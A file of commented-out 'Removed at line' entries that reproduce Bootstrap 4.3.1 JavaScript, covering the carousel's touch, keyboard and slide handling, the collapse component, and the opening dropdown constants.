// Removed at line 642:         }
// Removed at line 643:       };
// Removed at line 644:       _proto._addEventListeners = function _addEventListeners() {
// Removed at line 645:         var _this2 = this;
// Removed at line 646:         if (this._config.keyboard) {
// Removed at line 647:           $(this._element).on(Event$2.KEYDOWN, function (event) {
// Removed at line 648:             return _this2._keydown(event);
// Removed at line 649:           });
// Removed at line 650:         }
// Removed at line 651:         if (this._config.pause === 'hover') {
// Removed at line 652:           $(this._element).on(Event$2.MOUSEENTER, function (event) {
// Removed at line 653:             return _this2.pause(event);
// Removed at line 654:           }).on(Event$2.MOUSELEAVE, function (event) {
// Removed at line 655:             return _this2.cycle(event);
// Removed at line 656:           });
// Removed at line 657:         }
// Removed at line 658:         if (this._config.touch) {
// Removed at line 659:           this._addTouchEventListeners();
// Removed at line 660:         }
// Removed at line 661:       };
// Removed at line 662:       _proto._addTouchEventListeners = function _addTouchEventListeners() {
// Removed at line 663:         var _this3 = this;
// Removed at line 664:         if (!this._touchSupported) {
// Removed at line 665:           return;
// Removed at line 666:         }
// Removed at line 667:         var start = function start(event) {
// Removed at line 668:           if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
// Removed at line 669:             _this3.touchStartX = event.originalEvent.clientX;
// Removed at line 670:           } else if (!_this3._pointerEvent) {
// Removed at line 671:             _this3.touchStartX = event.originalEvent.touches[0].clientX;
// Removed at line 672:           }
// Removed at line 673:         };
// Removed at line 674:         var move = function move(event) {
// Removed at line 675:           // ensure swiping with one touch and not pinching
// Removed at line 676:           if (event.originalEvent.touches && event.originalEvent.touches.length > 1) {
// Removed at line 677:             _this3.touchDeltaX = 0;
// Removed at line 678:           } else {
// Removed at line 679:             _this3.touchDeltaX = event.originalEvent.touches[0].clientX - _this3.touchStartX;
// Removed at line 680:           }
// Removed at line 681:         };
// Removed at line 682:         var end = function end(event) {
// Removed at line 683:           if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
// Removed at line 684:             _this3.touchDeltaX = event.originalEvent.clientX - _this3.touchStartX;
// Removed at line 685:           }
// Removed at line 686:           _this3._handleSwipe();
// Removed at line 687:           if (_this3._config.pause === 'hover') {
// Removed at line 688:             // If it's a touch-enabled device, mouseenter/leave are fired as
// Removed at line 689:             // part of the mouse compatibility events on first tap - the carousel
// Removed at line 690:             // would stop cycling until user tapped out of it;
// Removed at line 691:             // here, we listen for touchend, explicitly pause the carousel
// Removed at line 692:             // (as if it's the second time we tap on it, mouseenter compat event
// Removed at line 693:             // is NOT fired) and after a timeout (to allow for mouse compatibility
// Removed at line 694:             // events to fire) we explicitly restart cycling
// Removed at line 695:             _this3.pause();
// Removed at line 696:             if (_this3.touchTimeout) {
// Removed at line 697:               clearTimeout(_this3.touchTimeout);
// Removed at line 698:             }
// Removed at line 699:             _this3.touchTimeout = setTimeout(function (event) {
// Removed at line 700:               return _this3.cycle(event);
// Removed at line 701:             }, TOUCHEVENT_COMPAT_WAIT + _this3._config.interval);
// Removed at line 702:           }
// Removed at line 703:         };
// Removed at line 704:         $(this._element.querySelectorAll(Selector$2.ITEM_IMG)).on(Event$2.DRAG_START, function (e) {
// Removed at line 705:           return e.preventDefault();
// Removed at line 706:         });
// Removed at line 707:         if (this._pointerEvent) {
// Removed at line 708:           $(this._element).on(Event$2.POINTERDOWN, function (event) {
// Removed at line 709:             return start(event);
// Removed at line 710:           });
// Removed at line 711:           $(this._element).on(Event$2.POINTERUP, function (event) {
// Removed at line 712:             return end(event);
// Removed at line 713:           });
// Removed at line 714:           this._element.classList.add(ClassName$2.POINTER_EVENT);
// Removed at line 715:         } else {
// Removed at line 716:           $(this._element).on(Event$2.TOUCHSTART, function (event) {
// Removed at line 717:             return start(event);
// Removed at line 718:           });
// Removed at line 719:           $(this._element).on(Event$2.TOUCHMOVE, function (event) {
// Removed at line 720:             return move(event);
// Removed at line 721:           });
// Removed at line 722:           $(this._element).on(Event$2.TOUCHEND, function (event) {
// Removed at line 723:             return end(event);
// Removed at line 724:           });
// Removed at line 725:         }
// Removed at line 726:       };
// Removed at line 727:       _proto._keydown = function _keydown(event) {
// Removed at line 728:         if (/input|textarea/i.test(event.target.tagName)) {
// Removed at line 729:           return;
// Removed at line 730:         }
// Removed at line 731:         switch (event.which) {
// Removed at line 732:           case ARROW_LEFT_KEYCODE:
// Removed at line 733:             event.preventDefault();
// Removed at line 734:             this.prev();
// Removed at line 735:             break;
// Removed at line 736:           case ARROW_RIGHT_KEYCODE:
// Removed at line 737:             event.preventDefault();
// Removed at line 738:             this.next();
// Removed at line 739:             break;
// Removed at line 740:           default:
// Removed at line 741:         }
// Removed at line 742:       };
// Removed at line 743:       _proto._getItemIndex = function _getItemIndex(element) {
// Removed at line 744:         this._items = element && element.parentNode ? [].slice.call(element.parentNode.querySelectorAll(Selector$2.ITEM)) : [];
// Removed at line 745:         return this._items.indexOf(element);
// Removed at line 746:       };
// Removed at line 747:       _proto._getItemByDirection = function _getItemByDirection(direction, activeElement) {
// Removed at line 748:         var isNextDirection = direction === Direction.NEXT;
// Removed at line 749:         var isPrevDirection = direction === Direction.PREV;
// Removed at line 750:         var activeIndex = this._getItemIndex(activeElement);
// Removed at line 751:         var lastItemIndex = this._items.length - 1;
// Removed at line 752:         var isGoingToWrap = isPrevDirection && activeIndex === 0 || isNextDirection && activeIndex === lastItemIndex;
// Removed at line 753:         if (isGoingToWrap && !this._config.wrap) {
// Removed at line 754:           return activeElement;
// Removed at line 755:         }
// Removed at line 756:         var delta = direction === Direction.PREV ? -1 : 1;
// Removed at line 757:         var itemIndex = (activeIndex + delta) % this._items.length;
// Removed at line 758:         return itemIndex === -1 ? this._items[this._items.length - 1] : this._items[itemIndex];
// Removed at line 759:       };
// Removed at line 760:       _proto._triggerSlideEvent = function _triggerSlideEvent(relatedTarget, eventDirectionName) {
// Removed at line 761:         var targetIndex = this._getItemIndex(relatedTarget);
// Removed at line 762:         var fromIndex = this._getItemIndex(this._element.querySelector(Selector$2.ACTIVE_ITEM));
// Removed at line 763:         var slideEvent = $.Event(Event$2.SLIDE, {
// Removed at line 764:           relatedTarget: relatedTarget,
// Removed at line 765:           direction: eventDirectionName,
// Removed at line 766:           from: fromIndex,
// Removed at line 767:           to: targetIndex
// Removed at line 768:         });
// Removed at line 769:         $(this._element).trigger(slideEvent);
// Removed at line 770:         return slideEvent;
// Removed at line 771:       };
// Removed at line 772:       _proto._setActiveIndicatorElement = function _setActiveIndicatorElement(element) {
// Removed at line 773:         if (this._indicatorsElement) {
// Removed at line 774:           var indicators = [].slice.call(this._indicatorsElement.querySelectorAll(Selector$2.ACTIVE));
// Removed at line 775:           $(indicators).removeClass(ClassName$2.ACTIVE);
// Removed at line 776:           var nextIndicator = this._indicatorsElement.children[this._getItemIndex(element)];
// Removed at line 777:           if (nextIndicator) {
// Removed at line 778:             $(nextIndicator).addClass(ClassName$2.ACTIVE);
// Removed at line 779:           }
// Removed at line 780:         }
// Removed at line 781:       };
// Removed at line 782:       _proto._slide = function _slide(direction, element) {
// Removed at line 783:         var _this4 = this;
// Removed at line 784:         var activeElement = this._element.querySelector(Selector$2.ACTIVE_ITEM);
// Removed at line 785:         var activeElementIndex = this._getItemIndex(activeElement);
// Removed at line 786:         var nextElement = element || activeElement && this._getItemByDirection(direction, activeElement);
// Removed at line 787:         var nextElementIndex = this._getItemIndex(nextElement);
// Removed at line 788:         var isCycling = Boolean(this._interval);
// Removed at line 789:         var directionalClassName;
// Removed at line 790:         var orderClassName;
// Removed at line 791:         var eventDirectionName;
// Removed at line 792:         if (direction === Direction.NEXT) {
// Removed at line 793:           directionalClassName = ClassName$2.LEFT;
// Removed at line 794:           orderClassName = ClassName$2.NEXT;
// Removed at line 795:           eventDirectionName = Direction.LEFT;
// Removed at line 796:         } else {
// Removed at line 797:           directionalClassName = ClassName$2.RIGHT;
// Removed at line 798:           orderClassName = ClassName$2.PREV;
// Removed at line 799:           eventDirectionName = Direction.RIGHT;
// Removed at line 800:         }
// Removed at line 801:         if (nextElement && $(nextElement).hasClass(ClassName$2.ACTIVE)) {
// Removed at line 802:           this._isSliding = false;
// Removed at line 803:           return;
// Removed at line 804:         }
// Removed at line 805:         var slideEvent = this._triggerSlideEvent(nextElement, eventDirectionName);
// Removed at line 806:         if (slideEvent.isDefaultPrevented()) {
// Removed at line 807:           return;
// Removed at line 808:         }
// Removed at line 809:         if (!activeElement || !nextElement) {
// Removed at line 810:           // Some weirdness is happening, so we bail
// Removed at line 811:           return;
// Removed at line 812:         }
// Removed at line 813:         this._isSliding = true;
// Removed at line 814:         if (isCycling) {
// Removed at line 815:           this.pause();
// Removed at line 816:         }
// Removed at line 817:         this._setActiveIndicatorElement(nextElement);
// Removed at line 818:         var slidEvent = $.Event(Event$2.SLID, {
// Removed at line 819:           relatedTarget: nextElement,
// Removed at line 820:           direction: eventDirectionName,
// Removed at line 821:           from: activeElementIndex,
// Removed at line 822:           to: nextElementIndex
// Removed at line 823:         });
// Removed at line 824:         if ($(this._element).hasClass(ClassName$2.SLIDE)) {
// Removed at line 825:           $(nextElement).addClass(orderClassName);
// Removed at line 826:           Util.reflow(nextElement);
// Removed at line 827:           $(activeElement).addClass(directionalClassName);
// Removed at line 828:           $(nextElement).addClass(directionalClassName);
// Removed at line 829:           var nextElementInterval = parseInt(nextElement.getAttribute('data-interval'), 10);
// Removed at line 830:           if (nextElementInterval) {
// Removed at line 831:             this._config.defaultInterval = this._config.defaultInterval || this._config.interval;
// Removed at line 832:             this._config.interval = nextElementInterval;
// Removed at line 833:           } else {
// Removed at line 834:             this._config.interval = this._config.defaultInterval || this._config.interval;
// Removed at line 835:           }
// Removed at line 836:           var transitionDuration = Util.getTransitionDurationFromElement(activeElement);
// Removed at line 837:           $(activeElement).one(Util.TRANSITION_END, function () {
// Removed at line 838:             $(nextElement).removeClass(directionalClassName + " " + orderClassName).addClass(ClassName$2.ACTIVE);
// Removed at line 839:             $(activeElement).removeClass(ClassName$2.ACTIVE + " " + orderClassName + " " + directionalClassName);
// Removed at line 840:             _this4._isSliding = false;
// Removed at line 841:             setTimeout(function () {
// Removed at line 842:               return $(_this4._element).trigger(slidEvent);
// Removed at line 843:             }, 0);
// Removed at line 844:           }).emulateTransitionEnd(transitionDuration);
// Removed at line 845:         } else {
// Removed at line 846:           $(activeElement).removeClass(ClassName$2.ACTIVE);
// Removed at line 847:           $(nextElement).addClass(ClassName$2.ACTIVE);
// Removed at line 848:           this._isSliding = false;
// Removed at line 849:           $(this._element).trigger(slidEvent);
// Removed at line 850:         }
// Removed at line 851:         if (isCycling) {
// Removed at line 852:           this.cycle();
// Removed at line 853:         }
// Removed at line 854:       } // Static
// Removed at line 855:         ;
// Removed at line 856:       Carousel._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 857:         return this.each(function () {
// Removed at line 858:           var data = $(this).data(DATA_KEY$2);
// Removed at line 859:           var _config = _objectSpread({}, Default, $(this).data());
// Removed at line 860:           if (typeof config === 'object') {
// Removed at line 861:             _config = _objectSpread({}, _config, config);
// Removed at line 862:           }
// Removed at line 863:           var action = typeof config === 'string' ? config : _config.slide;
// Removed at line 864:           if (!data) {
// Removed at line 865:             data = new Carousel(this, _config);
// Removed at line 866:             $(this).data(DATA_KEY$2, data);
// Removed at line 867:           }
// Removed at line 868:           if (typeof config === 'number') {
// Removed at line 869:             data.to(config);
// Removed at line 870:           } else if (typeof action === 'string') {
// Removed at line 871:             if (typeof data[action] === 'undefined') {
// Removed at line 872:               throw new TypeError("No method named \"" + action + "\"");
// Removed at line 873:             }
// Removed at line 874:             data[action]();
// Removed at line 875:           } else if (_config.interval && _config.ride) {
// Removed at line 876:             data.pause();
// Removed at line 877:             data.cycle();
// Removed at line 878:           }
// Removed at line 879:         });
// Removed at line 880:       };
// Removed at line 881:       Carousel._dataApiClickHandler = function _dataApiClickHandler(event) {
// Removed at line 882:         var selector = Util.getSelectorFromElement(this);
// Removed at line 883:         if (!selector) {
// Removed at line 884:           return;
// Removed at line 885:         }
// Removed at line 886:         var target = $(selector)[0];
// Removed at line 887:         if (!target || !$(target).hasClass(ClassName$2.CAROUSEL)) {
// Removed at line 888:           return;
// Removed at line 889:         }
// Removed at line 890:         var config = _objectSpread({}, $(target).data(), $(this).data());
// Removed at line 891:         var slideIndex = this.getAttribute('data-slide-to');
// Removed at line 892:         if (slideIndex) {
// Removed at line 893:           config.interval = false;
// Removed at line 894:         }
// Removed at line 895:         Carousel._jQueryInterface.call($(target), config);
// Removed at line 896:         if (slideIndex) {
// Removed at line 897:           $(target).data(DATA_KEY$2).to(slideIndex);
// Removed at line 898:         }
// Removed at line 899:         event.preventDefault();
// Removed at line 900:       };
// Removed at line 901:       _createClass(Carousel, null, [{
// Removed at line 902:         key: "VERSION",
// Removed at line 903:         get: function get() {
// Removed at line 904:           return VERSION$2;
// Removed at line 905:         }
// Removed at line 906:       }, {
// Removed at line 907:         key: "Default",
// Removed at line 908:         get: function get() {
// Removed at line 909:           return Default;
// Removed at line 910:         }
// Removed at line 911:       }]);
// Removed at line 912:       return Carousel;
// Removed at line 913:     }();
// Removed at line 914:   /**
// Removed at line 915:    * ------------------------------------------------------------------------
// Removed at line 916:    * Data Api implementation
// Removed at line 917:    * ------------------------------------------------------------------------
// Removed at line 918:    */
// Removed at line 919:   $(document).on(Event$2.CLICK_DATA_API, Selector$2.DATA_SLIDE, Carousel._dataApiClickHandler);
// Removed at line 920:   $(window).on(Event$2.LOAD_DATA_API, function () {
// Removed at line 921:     var carousels = [].slice.call(document.querySelectorAll(Selector$2.DATA_RIDE));
// Removed at line 922:     for (var i = 0, len = carousels.length; i < len; i++) {
// Removed at line 923:       var $carousel = $(carousels[i]);
// Removed at line 924:       Carousel._jQueryInterface.call($carousel, $carousel.data());
// Removed at line 925:     }
// Removed at line 926:   });
// Removed at line 927:   /**
// Removed at line 928:    * ------------------------------------------------------------------------
// Removed at line 929:    * jQuery
// Removed at line 930:    * ------------------------------------------------------------------------
// Removed at line 931:    */
// Removed at line 932:   $.fn[NAME$2] = Carousel._jQueryInterface;
// Removed at line 933:   $.fn[NAME$2].Constructor = Carousel;
// Removed at line 934:   $.fn[NAME$2].noConflict = function () {
// Removed at line 935:     $.fn[NAME$2] = JQUERY_NO_CONFLICT$2;
// Removed at line 936:     return Carousel._jQueryInterface;
// Removed at line 937:   };
// Removed at line 938:   /**
// Removed at line 939:    * ------------------------------------------------------------------------
// Removed at line 940:    * Constants
// Removed at line 941:    * ------------------------------------------------------------------------
// Removed at line 942:    */
// Removed at line 943:   var NAME$3 = 'collapse';
// Removed at line 944:   var VERSION$3 = '4.3.1';
// Removed at line 945:   var DATA_KEY$3 = 'bs.collapse';
// Removed at line 946:   var EVENT_KEY$3 = "." + DATA_KEY$3;
// Removed at line 947:   var DATA_API_KEY$3 = '.data-api';
// Removed at line 948:   var JQUERY_NO_CONFLICT$3 = $.fn[NAME$3];
// Removed at line 949:   var Default$1 = {
// Removed at line 950:     toggle: true,
// Removed at line 951:     parent: ''
// Removed at line 952:   };
// Removed at line 953:   var DefaultType$1 = {
// Removed at line 954:     toggle: 'boolean',
// Removed at line 955:     parent: '(string|element)'
// Removed at line 956:   };
// Removed at line 957:   var Event$3 = {
// Removed at line 958:     SHOW: "show" + EVENT_KEY$3,
// Removed at line 959:     SHOWN: "shown" + EVENT_KEY$3,
// Removed at line 960:     HIDE: "hide" + EVENT_KEY$3,
// Removed at line 961:     HIDDEN: "hidden" + EVENT_KEY$3,
// Removed at line 962:     CLICK_DATA_API: "click" + EVENT_KEY$3 + DATA_API_KEY$3
// Removed at line 963:   };
// Removed at line 964:   var ClassName$3 = {
// Removed at line 965:     SHOW: 'show',
// Removed at line 966:     COLLAPSE: 'collapse',
// Removed at line 967:     COLLAPSING: 'collapsing',
// Removed at line 968:     COLLAPSED: 'collapsed'
// Removed at line 969:   };
// Removed at line 970:   var Dimension = {
// Removed at line 971:     WIDTH: 'width',
// Removed at line 972:     HEIGHT: 'height'
// Removed at line 973:   };
// Removed at line 974:   var Selector$3 = {
// Removed at line 975:     ACTIVES: '.show, .collapsing',
// Removed at line 976:     DATA_TOGGLE: '[data-toggle="collapse"]'
// Removed at line 977:     /**
// Removed at line 978:      * ------------------------------------------------------------------------
// Removed at line 979:      * Class Definition
// Removed at line 980:      * ------------------------------------------------------------------------
// Removed at line 981:      */
// Removed at line 982:   };
// Removed at line 983:   var Collapse =
// Removed at line 984:     /*#__PURE__*/
// Removed at line 985:     function () {
// Removed at line 986:       function Collapse(element, config) {
// Removed at line 987:         this._isTransitioning = false;
// Removed at line 988:         this._element = element;
// Removed at line 989:         this._config = this._getConfig(config);
// Removed at line 990:         this._triggerArray = [].slice.call(document.querySelectorAll("[data-toggle=\"collapse\"][href=\"#" + element.id + "\"]," + ("[data-toggle=\"collapse\"][data-target=\"#" + element.id + "\"]")));
// Removed at line 991:         var toggleList = [].slice.call(document.querySelectorAll(Selector$3.DATA_TOGGLE));
// Removed at line 992:         for (var i = 0, len = toggleList.length; i < len; i++) {
// Removed at line 993:           var elem = toggleList[i];
// Removed at line 994:           var selector = Util.getSelectorFromElement(elem);
// Removed at line 995:           var filterElement = [].slice.call(document.querySelectorAll(selector)).filter(function (foundElem) {
// Removed at line 996:             return foundElem === element;
// Removed at line 997:           });
// Removed at line 998:           if (selector !== null && filterElement.length > 0) {
// Removed at line 999:             this._selector = selector;
// Removed at line 1000:             this._triggerArray.push(elem);
// Removed at line 1001:           }
// Removed at line 1002:         }
// Removed at line 1003:         this._parent = this._config.parent ? this._getParent() : null;
// Removed at line 1004:         if (!this._config.parent) {
// Removed at line 1005:           this._addAriaAndCollapsedClass(this._element, this._triggerArray);
// Removed at line 1006:         }
// Removed at line 1007:         if (this._config.toggle) {
// Removed at line 1008:           this.toggle();
// Removed at line 1009:         }
// Removed at line 1010:       } // Getters
// Removed at line 1011:       var _proto = Collapse.prototype;
// Removed at line 1012:       // Public
// Removed at line 1013:       _proto.toggle = function toggle() {
// Removed at line 1014:         if ($(this._element).hasClass(ClassName$3.SHOW)) {
// Removed at line 1015:           this.hide();
// Removed at line 1016:         } else {
// Removed at line 1017:           this.show();
// Removed at line 1018:         }
// Removed at line 1019:       };
// Removed at line 1020:       _proto.show = function show() {
// Removed at line 1021:         var _this = this;
// Removed at line 1022:         if (this._isTransitioning || $(this._element).hasClass(ClassName$3.SHOW)) {
// Removed at line 1023:           return;
// Removed at line 1024:         }
// Removed at line 1025:         var actives;
// Removed at line 1026:         var activesData;
// Removed at line 1027:         if (this._parent) {
// Removed at line 1028:           actives = [].slice.call(this._parent.querySelectorAll(Selector$3.ACTIVES)).filter(function (elem) {
// Removed at line 1029:             if (typeof _this._config.parent === 'string') {
// Removed at line 1030:               return elem.getAttribute('data-parent') === _this._config.parent;
// Removed at line 1031:             }
// Removed at line 1032:             return elem.classList.contains(ClassName$3.COLLAPSE);
// Removed at line 1033:           });
// Removed at line 1034:           if (actives.length === 0) {
// Removed at line 1035:             actives = null;
// Removed at line 1036:           }
// Removed at line 1037:         }
// Removed at line 1038:         if (actives) {
// Removed at line 1039:           activesData = $(actives).not(this._selector).data(DATA_KEY$3);
// Removed at line 1040:           if (activesData && activesData._isTransitioning) {
// Removed at line 1041:             return;
// Removed at line 1042:           }
// Removed at line 1043:         }
// Removed at line 1044:         var startEvent = $.Event(Event$3.SHOW);
// Removed at line 1045:         $(this._element).trigger(startEvent);
// Removed at line 1046:         if (startEvent.isDefaultPrevented()) {
// Removed at line 1047:           return;
// Removed at line 1048:         }
// Removed at line 1049:         if (actives) {
// Removed at line 1050:           Collapse._jQueryInterface.call($(actives).not(this._selector), 'hide');
// Removed at line 1051:           if (!activesData) {
// Removed at line 1052:             $(actives).data(DATA_KEY$3, null);
// Removed at line 1053:           }
// Removed at line 1054:         }
// Removed at line 1055:         var dimension = this._getDimension();
// Removed at line 1056:         $(this._element).removeClass(ClassName$3.COLLAPSE).addClass(ClassName$3.COLLAPSING);
// Removed at line 1057:         this._element.style[dimension] = 0;
// Removed at line 1058:         if (this._triggerArray.length) {
// Removed at line 1059:           $(this._triggerArray).removeClass(ClassName$3.COLLAPSED).attr('aria-expanded', true);
// Removed at line 1060:         }
// Removed at line 1061:         this.setTransitioning(true);
// Removed at line 1062:         var complete = function complete() {
// Removed at line 1063:           $(_this._element).removeClass(ClassName$3.COLLAPSING).addClass(ClassName$3.COLLAPSE).addClass(ClassName$3.SHOW);
// Removed at line 1064:           _this._element.style[dimension] = '';
// Removed at line 1065:           _this.setTransitioning(false);
// Removed at line 1066:           $(_this._element).trigger(Event$3.SHOWN);
// Removed at line 1067:         };
// Removed at line 1068:         var capitalizedDimension = dimension[0].toUpperCase() + dimension.slice(1);
// Removed at line 1069:         var scrollSize = "scroll" + capitalizedDimension;
// Removed at line 1070:         var transitionDuration = Util.getTransitionDurationFromElement(this._element);
// Removed at line 1071:         $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
// Removed at line 1072:         this._element.style[dimension] = this._element[scrollSize] + "px";
// Removed at line 1073:       };
// Removed at line 1074:       _proto.hide = function hide() {
// Removed at line 1075:         var _this2 = this;
// Removed at line 1076:         if (this._isTransitioning || !$(this._element).hasClass(ClassName$3.SHOW)) {
// Removed at line 1077:           return;
// Removed at line 1078:         }
// Removed at line 1079:         var startEvent = $.Event(Event$3.HIDE);
// Removed at line 1080:         $(this._element).trigger(startEvent);
// Removed at line 1081:         if (startEvent.isDefaultPrevented()) {
// Removed at line 1082:           return;
// Removed at line 1083:         }
// Removed at line 1084:         var dimension = this._getDimension();
// Removed at line 1085:         this._element.style[dimension] = this._element.getBoundingClientRect()[dimension] + "px";
// Removed at line 1086:         Util.reflow(this._element);
// Removed at line 1087:         $(this._element).addClass(ClassName$3.COLLAPSING).removeClass(ClassName$3.COLLAPSE).removeClass(ClassName$3.SHOW);
// Removed at line 1088:         var triggerArrayLength = this._triggerArray.length;
// Removed at line 1089:         if (triggerArrayLength > 0) {
// Removed at line 1090:           for (var i = 0; i < triggerArrayLength; i++) {
// Removed at line 1091:             var trigger = this._triggerArray[i];
// Removed at line 1092:             var selector = Util.getSelectorFromElement(trigger);
// Removed at line 1093:             if (selector !== null) {
// Removed at line 1094:               var $elem = $([].slice.call(document.querySelectorAll(selector)));
// Removed at line 1095:               if (!$elem.hasClass(ClassName$3.SHOW)) {
// Removed at line 1096:                 $(trigger).addClass(ClassName$3.COLLAPSED).attr('aria-expanded', false);
// Removed at line 1097:               }
// Removed at line 1098:             }
// Removed at line 1099:           }
// Removed at line 1100:         }
// Removed at line 1101:         this.setTransitioning(true);
// Removed at line 1102:         var complete = function complete() {
// Removed at line 1103:           _this2.setTransitioning(false);
// Removed at line 1104:           $(_this2._element).removeClass(ClassName$3.COLLAPSING).addClass(ClassName$3.COLLAPSE).trigger(Event$3.HIDDEN);
// Removed at line 1105:         };
// Removed at line 1106:         this._element.style[dimension] = '';
// Removed at line 1107:         var transitionDuration = Util.getTransitionDurationFromElement(this._element);
// Removed at line 1108:         $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
// Removed at line 1109:       };
// Removed at line 1110:       _proto.setTransitioning = function setTransitioning(isTransitioning) {
// Removed at line 1111:         this._isTransitioning = isTransitioning;
// Removed at line 1112:       };
// Removed at line 1113:       _proto.dispose = function dispose() {
// Removed at line 1114:         $.removeData(this._element, DATA_KEY$3);
// Removed at line 1115:         this._config = null;
// Removed at line 1116:         this._parent = null;
// Removed at line 1117:         this._element = null;
// Removed at line 1118:         this._triggerArray = null;
// Removed at line 1119:         this._isTransitioning = null;
// Removed at line 1120:       } // Private
// Removed at line 1121:         ;
// Removed at line 1122:       _proto._getConfig = function _getConfig(config) {
// Removed at line 1123:         config = _objectSpread({}, Default$1, config);
// Removed at line 1124:         config.toggle = Boolean(config.toggle); // Coerce string values
// Removed at line 1125:         Util.typeCheckConfig(NAME$3, config, DefaultType$1);
// Removed at line 1126:         return config;
// Removed at line 1127:       };
// Removed at line 1128:       _proto._getDimension = function _getDimension() {
// Removed at line 1129:         var hasWidth = $(this._element).hasClass(Dimension.WIDTH);
// Removed at line 1130:         return hasWidth ? Dimension.WIDTH : Dimension.HEIGHT;
// Removed at line 1131:       };
// Removed at line 1132:       _proto._getParent = function _getParent() {
// Removed at line 1133:         var _this3 = this;
// Removed at line 1134:         var parent;
// Removed at line 1135:         if (Util.isElement(this._config.parent)) {
// Removed at line 1136:           parent = this._config.parent; // It's a jQuery object
// Removed at line 1137:           if (typeof this._config.parent.jquery !== 'undefined') {
// Removed at line 1138:             parent = this._config.parent[0];
// Removed at line 1139:           }
// Removed at line 1140:         } else {
// Removed at line 1141:           parent = document.querySelector(this._config.parent);
// Removed at line 1142:         }
// Removed at line 1143:         var selector = "[data-toggle=\"collapse\"][data-parent=\"" + this._config.parent + "\"]";
// Removed at line 1144:         var children = [].slice.call(parent.querySelectorAll(selector));
// Removed at line 1145:         $(children).each(function (i, element) {
// Removed at line 1146:           _this3._addAriaAndCollapsedClass(Collapse._getTargetFromElement(element), [element]);
// Removed at line 1147:         });
// Removed at line 1148:         return parent;
// Removed at line 1149:       };
// Removed at line 1150:       _proto._addAriaAndCollapsedClass = function _addAriaAndCollapsedClass(element, triggerArray) {
// Removed at line 1151:         var isOpen = $(element).hasClass(ClassName$3.SHOW);
// Removed at line 1152:         if (triggerArray.length) {
// Removed at line 1153:           $(triggerArray).toggleClass(ClassName$3.COLLAPSED, !isOpen).attr('aria-expanded', isOpen);
// Removed at line 1154:         }
// Removed at line 1155:       } // Static
// Removed at line 1156:         ;
// Removed at line 1157:       Collapse._getTargetFromElement = function _getTargetFromElement(element) {
// Removed at line 1158:         var selector = Util.getSelectorFromElement(element);
// Removed at line 1159:         return selector ? document.querySelector(selector) : null;
// Removed at line 1160:       };
// Removed at line 1161:       Collapse._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 1162:         return this.each(function () {
// Removed at line 1163:           var $this = $(this);
// Removed at line 1164:           var data = $this.data(DATA_KEY$3);
// Removed at line 1165:           var _config = _objectSpread({}, Default$1, $this.data(), typeof config === 'object' && config ? config : {});
// Removed at line 1166:           if (!data && _config.toggle && /show|hide/.test(config)) {
// Removed at line 1167:             _config.toggle = false;
// Removed at line 1168:           }
// Removed at line 1169:           if (!data) {
// Removed at line 1170:             data = new Collapse(this, _config);
// Removed at line 1171:             $this.data(DATA_KEY$3, data);
// Removed at line 1172:           }
// Removed at line 1173:           if (typeof config === 'string') {
// Removed at line 1174:             if (typeof data[config] === 'undefined') {
// Removed at line 1175:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 1176:             }
// Removed at line 1177:             data[config]();
// Removed at line 1178:           }
// Removed at line 1179:         });
// Removed at line 1180:       };
// Removed at line 1181:       _createClass(Collapse, null, [{
// Removed at line 1182:         key: "VERSION",
// Removed at line 1183:         get: function get() {
// Removed at line 1184:           return VERSION$3;
// Removed at line 1185:         }
// Removed at line 1186:       }, {
// Removed at line 1187:         key: "Default",
// Removed at line 1188:         get: function get() {
// Removed at line 1189:           return Default$1;
// Removed at line 1190:         }
// Removed at line 1191:       }]);
// Removed at line 1192:       return Collapse;
// Removed at line 1193:     }();
// Removed at line 1194:   /**
// Removed at line 1195:    * ------------------------------------------------------------------------
// Removed at line 1196:    * Data Api implementation
// Removed at line 1197:    * ------------------------------------------------------------------------
// Removed at line 1198:    */
// Removed at line 1199:   $(document).on(Event$3.CLICK_DATA_API, Selector$3.DATA_TOGGLE, function (event) {
// Removed at line 1200:     // preventDefault only for <a> elements (which change the URL) not inside the collapsible element
// Removed at line 1201:     if (event.currentTarget.tagName === 'A') {
// Removed at line 1202:       event.preventDefault();
// Removed at line 1203:     }
// Removed at line 1204:     var $trigger = $(this);
// Removed at line 1205:     var selector = Util.getSelectorFromElement(this);
// Removed at line 1206:     var selectors = [].slice.call(document.querySelectorAll(selector));
// Removed at line 1207:     $(selectors).each(function () {
// Removed at line 1208:       var $target = $(this);
// Removed at line 1209:       var data = $target.data(DATA_KEY$3);
// Removed at line 1210:       var config = data ? 'toggle' : $trigger.data();
// Removed at line 1211:       Collapse._jQueryInterface.call($target, config);
// Removed at line 1212:     });
// Removed at line 1213:   });
// Removed at line 1214:   /**
// Removed at line 1215:    * ------------------------------------------------------------------------
// Removed at line 1216:    * jQuery
// Removed at line 1217:    * ------------------------------------------------------------------------
// Removed at line 1218:    */
// Removed at line 1219:   $.fn[NAME$3] = Collapse._jQueryInterface;
// Removed at line 1220:   $.fn[NAME$3].Constructor = Collapse;
// Removed at line 1221:   $.fn[NAME$3].noConflict = function () {
// Removed at line 1222:     $.fn[NAME$3] = JQUERY_NO_CONFLICT$3;
// Removed at line 1223:     return Collapse._jQueryInterface;
// Removed at line 1224:   };
// Removed at line 1225:   /**
// Removed at line 1226:    * ------------------------------------------------------------------------
// Removed at line 1227:    * Constants
// Removed at line 1228:    * ------------------------------------------------------------------------
// Removed at line 1229:    */
// Removed at line 1230:   var NAME$4 = 'dropdown';
// Removed at line 1231:   var VERSION$4 = '4.3.1';
// Removed at line 1232:   var DATA_KEY$4 = 'bs.dropdown';
// Removed at line 1233:   var EVENT_KEY$4 = "." + DATA_KEY$4;
// Removed at line 1234:   var DATA_API_KEY$4 = '.data-api';
// Removed at line 1235:   var JQUERY_NO_CONFLICT$4 = $.fn[NAME$4];
// Removed at line 1236:   var ESCAPE_KEYCODE = 27; // KeyboardEvent.which value for Escape (Esc) key
// Removed at line 1237:   var SPACE_KEYCODE = 32; // KeyboardEvent.which value for space key
// Removed at line 1238:   var TAB_KEYCODE = 9; // KeyboardEvent.which value for tab key
// Removed at line 1239:   var ARROW_UP_KEYCODE = 38; // KeyboardEvent.which value for up arrow key
